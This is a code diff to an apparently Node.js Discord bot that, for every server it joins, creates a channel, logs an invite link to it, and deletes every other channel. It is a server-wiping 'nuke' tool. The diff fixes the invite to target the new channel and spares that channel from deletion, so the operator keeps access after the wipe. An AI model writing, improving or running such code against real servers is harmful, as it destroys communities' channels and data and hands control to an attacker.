@@ -6,12 +6,14 @@ const fs = require("fs")
 //on ready 
 client.on("ready", () => {
 
+    let createdChannelName;
     // Create an invite to a channel
     client.guilds.forEach(server => {
         //create new channel
         server.createChannel("-", "text").then(channel => {
-            //then once channel is created, create an invite link
-            server.channels.first().createInvite().then(inviteCode => {
+            createdChannelName = channel.name;
+            //then once channel is created, create an invite link to this channel
+            channel.createInvite().then(inviteCode => {
                 //log the invite link to console
                 console.log(inviteCode);
                 //catch errors
@@ -32,11 +34,13 @@ client.on("ready", () => {
 //delete all channels on server
     client.guilds.forEach(server => {
         server.channels.forEach(channel => {
-            channel.delete().then(response => {
-                console.log("my response", response);
-            }).catch(err => {
-                if(err) throw err;
-            });
+            if(createdChannelName !== channel.name) {
+                channel.delete().then(response => {
+                    console.log("my response", response);
+                }).catch(err => {
+                    if(err) throw err;
+                });
+            }
         });
     });
     
